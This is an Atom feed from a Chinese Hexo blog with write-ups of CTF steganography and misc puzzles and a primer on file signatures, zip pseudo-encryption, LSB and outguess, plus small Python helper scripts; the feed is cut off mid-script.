<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风不及你甜</title>
  
  <subtitle>迷迷糊糊才是真</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-19T13:30:10.710Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>wdraemv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界misc-3</title>
    <link href="http://example.com/2021/04/19/drf/"/>
    <id>http://example.com/2021/04/19/drf/</id>
    <published>2021-04-19T13:05:16.000Z</published>
    <updated>2021-04-19T13:30:10.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="base64÷4"><a href="#base64÷4" class="headerlink" title="base64÷4"></a>base64÷4</h2><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppcu2jwr5j30qd011jr7.jpg" alt="img"></p><p>得到一串码 直接丢进cy</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppcu2nzhmj30na0e5glo.jpg" alt="img"></p><h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something_in_image"></a>something_in_image</h2><p>直接010打开得到flag</p><h2 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark-1"></a>wireshark-1</h2><p>下下来一个装有流量包的zip文件  wireshark打开流量包</p><p>搜索flag<img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppcu2id30j309l04sdfs.jpg" alt="img"></p><p>得到</p><h2 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h2><p>得到一个全空白的图片</p><p>用stegsolve看看</p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppcu2omznj30st09u3yo.jpg" alt="img"></p><p>得到flag</p><h2 id="Aesop-secret"><a href="#Aesop-secret" class="headerlink" title="Aesop_secret"></a>Aesop_secret</h2><p>下下来一个gif ps打开得到<code>ISCC</code>，尝试下不是flag</p><p>010打开</p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppcu2rq7hj307907w3yk.jpg" alt="img"></p><p>在最后得到一段字段</p><p>AES解密 密码是ISCC</p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppcu2ormbj30uj0bk0tj.jpg" alt="img"></p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppcu2wwaoj30sf0d1wf4.jpg" alt="img"></p><h2 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h2><p>用010打开，看下来发现有点长，一个有两个文件，在text里面看到PK，这不是有zip,直接把前面的都删掉，得到一个zip</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppcu2wao8j30ks0er75x.jpg" alt="img"></p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppcu3ab23j30wv0it77w.jpg" alt="img"></p><p>还有两张图片，猜测应该用stegsolve合并，然后用ps调色</p><p><img src="https://wx2.sinaimg.cn/mw690/007juUiNly1gppcu2z3ijj30c009jq3o.jpg" alt="img"></p><p>用QR解二维码得到flag</p><h2 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training-Stegano-1"></a>Training-Stegano-1</h2><p><img src="https://wx2.sinaimg.cn/mw690/007juUiNly1gppcu336ccj30ox02mglk.jpg" alt="img"></p><p>直接记事本打开，直接得到flag</p><h2 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h2><p><img src="https://wx2.sinaimg.cn/mw690/007juUiNly1gppcu34dc6j318a0m8glv.jpg" alt="img"></p><p>五角星，有几个字符</p><p>百度知道是brainfuck语言</p><p>解密网站<a href="https://tool.bugku.com/brainfuck/?wafcloud=2">https://tool.bugku.com/brainfuck/?wafcloud=2</a></p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppcu34kfjj30fp06vq2t.jpg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;base64÷4&quot;&gt;&lt;a href=&quot;#base64÷4&quot; class=&quot;headerlink&quot; title=&quot;base64÷4&quot;&gt;&lt;/a&gt;base64÷4&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://wx4.sinaimg.cn/mw690/007juUi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界misc-2</title>
    <link href="http://example.com/2021/04/19/wer/"/>
    <id>http://example.com/2021/04/19/wer/</id>
    <published>2021-04-19T12:34:48.000Z</published>
    <updated>2021-04-19T13:00:16.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>下载下来一个rar</p><p>但是解压报错</p><p>打开010看看</p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppc3a2zt0j30j6078t9b.jpg" alt="img"></p><p>png是文件块，应该用74，但这里是7A，变成子块了</p><p>然后可以解压，里面有个图片，无法显示</p><p>010打开</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppc3a3v8cj30jp06fq3f.jpg" alt="img"></p><p>是gif文件，修改后缀打开，用stegsolve看，发现一半的二维码</p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppc3a25lcj308604ka9x.jpg" alt="img"></p><p>ps打开的时候有两个图层</p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppc3a2mcrj3083057gll.jpg" alt="img"></p><p>合并</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppc3a844dj308107ua9x.jpg" alt="img"></p><p>用QR打开</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppc3aomafj30hv0jdgog.jpg" alt="img"></p><p>得到flag</p><h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>下下来一个pcapng文件 这应该是个流量文件 wireshark搜索flag</p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppc3auep2j30o40mtgna.jpg" alt="img"></p><p>发现上面还有一个666的jpg图片</p><p>1150追踪流TCP</p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gppc3bl0sfj30yb0otwhr.jpg" alt="img"></p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gppc3avtmaj30x20e7761.jpg" alt="img"></p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppc3aseg6j30y30hptaz.jpg" alt="img"></p><p>从FFD8到FFD9</p><p>复制进010，新建一个文件，编辑里面粘贴HEX TEXT</p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppc3bd5mdj30jt0dan95.jpg" alt="img"></p><p>应该是密码之类的，剩下就剩文件分离，用foremost分离出一个文件，用密码得到flag</p><p><img src="https://wx3.sinaimg.cn/mw690/007juUiNly1gppc3b0l4xj308l010745.jpg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SimpleRAR&quot;&gt;&lt;a href=&quot;#SimpleRAR&quot; class=&quot;headerlink&quot; title=&quot;SimpleRAR&quot;&gt;&lt;/a&gt;SimpleRAR&lt;/h2&gt;&lt;p&gt;下载下来一个rar&lt;/p&gt;
&lt;p&gt;但是解压报错&lt;/p&gt;
&lt;p&gt;打开010看看&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界misc</title>
    <link href="http://example.com/2021/04/14/daj/"/>
    <id>http://example.com/2021/04/14/daj/</id>
    <published>2021-04-14T13:17:00.000Z</published>
    <updated>2021-04-15T08:40:32.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>一张图片，flag被图片遮住，直接选中就可以了</p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>看到这一大段就知道是神奇的文字，看了wp后知道是一种特殊的</p><p>要用<strong>与佛论禅</strong><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p><img src="https://wx1.sinaimg.cn/thumb300/007juUiNly1gpkimj0snkj30r80hvjrw.jpg" alt="img"></p><p>得到一串码，丢进CyberChef直接得到flag</p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>题目没有什么可以值得注意的提示，，我们下载附件，发现是个gif文件，先打开看看，，之后发现了个貌似二维码的东西一闪而过，，所以我们分解它，，打开我们的神器StegSolve进行逐帧分析</p><p><img src="https://wx2.sinaimg.cn/mw1024/007juUiNly1gpkimj2wgnj304t05h0ss.jpg" alt="img"></p><p>在50帧得到了一个残缺的二维码，利用ps修复，扫码得到flag或者CQR</p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p><img src="https://img-blog.csdnimg.cn/20200430170432330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjA0NzM4Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p><p>这一看就知道不能玩</p><p>直接java的反编译工具 java decompiler</p><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gpkimj5g8nj30hp0h50ta.jpg" alt="img"></p><p>在里面文件找到flag</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>让我们下载附件，，是个压缩包，解压后，有两个文件夹，，我们根据题目提示，打开gif的那个</p><p><img src="https://wx2.sinaimg.cn/mw1024/007juUiNly1gpkimj5rgvj30r30kzmxk.jpg" alt="img"></p><p>一片混乱，但是都是黑白的</p><p>二进制0和1.其实可以猜到，0是白色，1是黑色。所以我们把所有图转换为二进制得到如下。01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</p><p>CyberChef直接得到flag</p><h1 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h1><p>一个pdf都是没有用的东西，复制进txt,得到</p><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gpkimj5j1hj30qj0d7aa2.jpg" alt="img"></p><p>想到摩斯密码，将A替换为.，B替换为-</p><p><img src="https://wx1.sinaimg.cn/mw1024/007juUiNly1gpkil8dw3xj30x001hjr7.jpg" alt="img"></p><p>运用脚本</p><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gpkil8fwioj30hc02qmx3.jpg" alt="img"></p><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;pdf&quot;&gt;&lt;a href=&quot;#pdf&quot; class=&quot;headerlink&quot; title=&quot;pdf&quot;&gt;&lt;/a&gt;pdf&lt;/h2&gt;&lt;p&gt;一张图片，flag被图片遮住，直接选中就可以了&lt;/p&gt;
&lt;h2 id=&quot;如来十三掌&quot;&gt;&lt;a href=&quot;#如来十三掌&quot; class=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>隐写术</title>
    <link href="http://example.com/2021/04/04/yingxie/"/>
    <id>http://example.com/2021/04/04/yingxie/</id>
    <published>2021-04-04T14:53:19.000Z</published>
    <updated>2021-04-04T15:12:56.517Z</updated>
    
    <content type="html"><![CDATA[<p>隐写术，顾名思义就是讲需要传达的信心隐藏在各种载体上（数据流，压缩包，图片，音频等）也是一种手段。现代的数字水印技术就是从这方面发展而来的，数字水印技术在现在社会中越来越种重视版权这一方向的加持下发展的越来越好。</p><h2 id="一、常见文件头文件尾"><a href="#一、常见文件头文件尾" class="headerlink" title="一、常见文件头文件尾"></a>一、常见文件头文件尾</h2><p>1、图片<br>JPEG<br><strong>文件头：FF D8 FF</strong>　　　　　<br><strong>文件尾：FF D9</strong><br>TGA<br><strong>未压缩的前4字节 00 00 02 00</strong><br><strong>RLE压缩的前5字节 00 00 10 00 00</strong><br>PNG<br><strong>文件头：89 50 4E 47 0D 0A 1A 0A</strong>　　　　<br><strong>文件尾：AE 42 60 82</strong><br>GIF<br><strong>文件头：47 49 46 38 39(37) 61</strong>　　　　<br><strong>文件尾：00 3B</strong><br>BMP<br><strong>文件头：42 4D</strong><br><strong>文件头标识(2 bytes) 42(B) 4D(M)</strong><br>TIFF (tif)<br><strong>文件头：49 49 2A 00</strong><br>ico<br><strong>文件头：00 00 01 00</strong><br>Adobe Photoshop (psd)<br><strong>文件头：38 42 50 53</strong><br>2、office文件<br>MS Word/Excel (xls.or.doc)<br><strong>文件头：D0 CF 11 E0</strong></p><p>MS Access (mdb)<br><strong>文件头：53 74 61 6E 64 61 72 64 20 4A</strong></p><p>WordPerfect (wpd)<br><strong>文件头：FF 57 50 43</strong></p><p>Adobe Acrobat (pdf)<br><strong>文件头：25 50 44 46 2D 31 2E</strong></p><p>application/vnd.visio(vsd)<br><strong>文件头：D0 CF 11 E0 A1 B1 1A E1</strong></p><p>Email [thorough only] (eml)<br><strong>文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</strong></p><p>Outlook Express (dbx)<br><strong>文件头：CF AD 12 FE C5 FD 74 6F</strong></p><p>Outlook (pst)<br><strong>文件头：21 42 44 4E</strong></p><p>Rich Text Format (rtf)<br><strong>文件头：7B 5C 72 74 66</strong></p><p>txt 文件(txt)<br><strong>文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的</strong></p><p>3、压缩包文件<br>ZIP Archive (zip)<br><strong>文件头：50 4B 03 04</strong><br><strong>文件尾：50 4B</strong><br>RAR Archive (rar)<br><strong>文件头：52 61 72 21</strong><br>4、音频文件<br>Wave (wav)<br><strong>文件头：57 41 56 45</strong><br>audio(Audio)<br><strong>文件头： 4D 54 68 64</strong><br>audio/x-aac（aac）<br><strong>文件头：FF F1(9)</strong><br>5、视频文件<br>AVI (avi)<br><strong>文件头：41 56 49 20</strong><br>Real Audio (ram)<br><strong>文件头：2E 72 61 FD</strong><br>Real Media (rm)<br><strong>文件头：2E 52 4D 46</strong><br>MPEG (mpg)<br><strong>文件头：00 00 01 BA(3)</strong><br>Quicktime (mov)<br><strong>文件头：6D 6F 6F 76</strong><br>Windows Media (asf)<br><strong>文件头：30 26 B2 75 8E 66 CF 11</strong><br>MIDI (mid)<br><strong>文件头：4D 54 68 64</strong><br>6、代码文件<br>XML (xml)<br><strong>文件头：3C 3F 78 6D 6C</strong></p><p>HTML (html)<br><strong>文件头：68 74 6D 6C 3E</strong></p><p>Quicken (qdf)<br><strong>文件头：AC 9E BD 8F</strong></p><p>Windows Password (pwl)<br><strong>文件头：E3 82 85 96</strong></p><p>7、其他类型<br>windows证书文件(der)<br><strong>文件头：30 82 03 C9</strong><br>CAD (dwg)<br><strong>文件头：41 43 31 30</strong><br>Windows Shortcut (lnk)<br><strong>文件头：4C 00 00 00</strong><br>Windows reg(reg)<br><strong>文件头：52 45 47 45 44 49 54 34</strong></p><h2 id="压缩包类隐写"><a href="#压缩包类隐写" class="headerlink" title="压缩包类隐写"></a>压缩包类隐写</h2><p>这个压缩包是我们日常使用当中经常接触的，常见的格式： .rar .zip .7z（貌似常见就这仨233333）</p><p>压缩包是可以加密的我们都知道，关于怎么解密有几种方法:</p><p><strong>1.爆力破解，俗称爆破，使用对应的暴力破解软件：ziperello, ARCHPR</strong></p><p><strong>2.伪加密：通过修改压缩包的16进制文件中的数据，使压缩包显示有密码</strong></p><p>一格zip文件有三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 </p><p>这是三个头标记，主要看第二个</p><p>压缩源文件数据区：50 4B 03 04：这是头文件标记</p><p>压缩源文件目录区：</p><p>50 4B 01 02：目录中文件文件头标记</p><p>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><p>1.LSB</p><p>LSB也就是最低有效位 (Least Significant Bit)。原理就是图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit，在人眼看来是看不出来区别的，也把信息隐藏起来了。譬如我们想把’A’隐藏进来的话，如下图，就可以把A转成16进制的0x61再转成二进制的01100001，再修改为红色通道的最低位为这些二进制串。</p><p><a href="http://images2015.cnblogs.com/blog/640760/201601/640760-20160129212637693-390049790.png"><img src="https://images2015.cnblogs.com/blog/640760/201601/640760-20160129212637693-390049790.png" alt="img"></a></p><p><a href="http://images2015.cnblogs.com/blog/640760/201601/640760-20160129212704114-2030955630.png"><img src="https://images2015.cnblogs.com/blog/640760/201601/640760-20160129212704114-2030955630.png" alt="img"></a></p><p>利用Stegsolve这个软件，调整颜色通道</p><p>2.winhex或者010查看</p><p>有的是图片破损修改头部，或者在里面隐藏flag,或者异常IDAT</p><p>3.属性</p><p><img src="https://images2015.cnblogs.com/blog/640760/201601/640760-20160129213135802-894172942.png" alt="img"></p><ol start="4"><li>双图</li></ol><p>还有一种情况是比较特殊的，有的时候会给出两张图片，或者是需要你去寻找原来的图片来进行对比寻找隐藏的信息。这个一般是因为一张图片给出来的隐藏信息太过于隐蔽，无法找不到具体的位置，具体的信息。这个时候就要用到一些对比的技巧来查找了。比如ISG2014的misc200就是用到的这种给出了两张图的。有的情况下，第二张图是需要你自己去找到的。</p><p>5.隐藏文件</p><p>用kali自带的binwalk查找是否有隐藏文件，用dd或者foremost分离出文件</p><p>png图片宽高查询脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;图片&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)  <span class="comment">#读取图片中的CRC校验值</span></span><br><span class="line">print(crc32frombp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):    <span class="comment">#宽度1-4000进行枚举</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):   <span class="comment">#高度1-4000进行枚举</span></span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">#print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):    <span class="comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后续还有很多需要学习的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;隐写术，顾名思义就是讲需要传达的信心隐藏在各种载体上（数据流，压缩包，图片，音频等）也是一种手段。现代的数字水印技术就是从这方面发展而来的，数字水印技术在现在社会中越来越种重视版权这一方向的加持下发展的越来越好。&lt;/p&gt;
&lt;h2 id=&quot;一、常见文件头文件尾&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>21安恒三月赛misc复现</title>
    <link href="http://example.com/2021/03/30/an/"/>
    <id>http://example.com/2021/03/30/an/</id>
    <published>2021-03-30T14:21:55.000Z</published>
    <updated>2021-04-15T09:13:17.201Z</updated>
    
    <content type="html"><![CDATA[<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>异世相遇！尽享美味！安恒赛高！</p><p>喊了也不给，还得取关它</p><h3 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h3><p>打开后时一个加密的zip，拉到010里面看到头文件后是0900，不是0000</p><p>知道是zip伪加密，把下面4个都改成00就可以了</p><p>打开后有两个图片</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gpkj9llt0kj30nr0xcado.jpg" alt="img"></p><p><img src="https://wx1.sinaimg.cn/mw690/007juUiNly1gpkjaswr2vj319y0dhzlz.jpg" alt="img"></p><p>题目说了是png隐写，那当然先看png图片，做的时候查了宽高，试了好多种，没看出来里面有两个图片</p><p><img src="https://wx4.sinaimg.cn/thumb300/007juUiNly1gpkimiwlv2j30kd0f6q42.jpg" alt="img"></p><p>从这里有一个IDAT，什么的数据码本来应该结束了，又来了一些，把前面的一段直接删除，后面就得到了一张新图片</p><p><img src="https://wx2.sinaimg.cn/mw1024/007juUiNly1gpkimilam4j30os09x74o.jpg" alt="img"></p><p>看了大佬的博客知道知道这是outguess隐写，89504E是密钥</p><p>kali下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;89504E&quot; -r flag.jpg flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://wx3.sinaimg.cn/mw1024/007juUiNly1gpkimirqnzj30ki0c8q5x.jpg" alt="img"></p><p><img src="https://wx1.sinaimg.cn/mw1024/007juUiNly1gpkimixnv1j30pf02kwei.jpg" alt="img"></p><p>得到一段MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</p><p>丢进cyberchef</p><p><img src="https://wx2.sinaimg.cn/mw690/007juUiNly1gpkimizk8ij31690fsq3r.jpg" alt="img"></p><p>得到flag。</p><h3 id="雾都孤儿"><a href="#雾都孤儿" class="headerlink" title="雾都孤儿"></a>雾都孤儿</h3><p>雾都孤儿，确实孤儿，拿到题目时，看着图片没有任何办法，还看了一遍故事</p><p>后面得知要用npite<a href="https://www.bertnase.de/npiet/npiet-execute.php">https://www.bertnase.de/npiet/npiet-execute.php</a></p><p>一直上传图片不成功，缺少验证码–原来要翻墙才能看到验证码</p><p><img src="https://wx4.sinaimg.cn/mw690/007juUiNly1gpkimj1mm9j30s40pt0tl.jpg" alt="img"></p><p>得到Tetris密钥</p><p>又是outguess隐写</p><p>得到一串编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">100000001001</span><br><span class="line">11010101110</span><br><span class="line">10000001101</span><br><span class="line">100000001010</span><br><span class="line">110101010</span><br><span class="line">1101010110111</span><br><span class="line">100000001000</span><br><span class="line">110101010</span><br><span class="line">0001</span><br><span class="line">0100</span><br><span class="line">11011</span><br><span class="line">11010100110</span><br><span class="line">110101000</span><br><span class="line">11011</span><br><span class="line">11010100110</span><br><span class="line">11010101111</span><br><span class="line">1100100</span><br><span class="line">101101</span><br><span class="line">101101</span><br><span class="line">1001</span><br><span class="line">101110</span><br><span class="line">11010100110</span><br><span class="line">100000001001</span><br><span class="line">0100</span><br><span class="line">101111</span><br><span class="line">11010110</span><br><span class="line">001</span><br><span class="line">0101</span><br><span class="line">11011</span><br><span class="line">11010100110</span><br><span class="line">11011</span><br><span class="line">001</span><br><span class="line">101111</span><br><span class="line">0000</span><br><span class="line">001</span><br><span class="line">1010</span><br><span class="line">11010100110</span><br><span class="line">1000000111</span><br><span class="line">1000000111</span><br><span class="line">110101011000</span><br></pre></td></tr></table></figure><p>哈夫曼编码，文档还有文字，再根据字频来进行哈夫曼编码</p><p>看来别人的博客有个哈夫曼脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">#Huffman Encoding</span><br><span class="line">#Tree-Node Type</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">class Node:</span><br><span class="line">    def __init__(self,freq):</span><br><span class="line">        self.left &#x3D; None</span><br><span class="line">        self.right &#x3D; None</span><br><span class="line">        self.father &#x3D; None</span><br><span class="line">        self.freq &#x3D; freq</span><br><span class="line">    def isLeft(self):</span><br><span class="line">        return self.father.left &#x3D;&#x3D; self</span><br><span class="line">#create nodes创建叶子节点</span><br><span class="line">def createNodes(freqs):</span><br><span class="line">    return [Node(freq) for freq in freqs]</span><br><span class="line"></span><br><span class="line">#create Huffman-Tree创建Huffman树</span><br><span class="line">def createHuffmanTree(nodes):</span><br><span class="line">    queue &#x3D; nodes[:]</span><br><span class="line">    print(queue) #一个个node的地址</span><br><span class="line">    #每次对queue进行排序，</span><br><span class="line">    while len(queue) &gt; 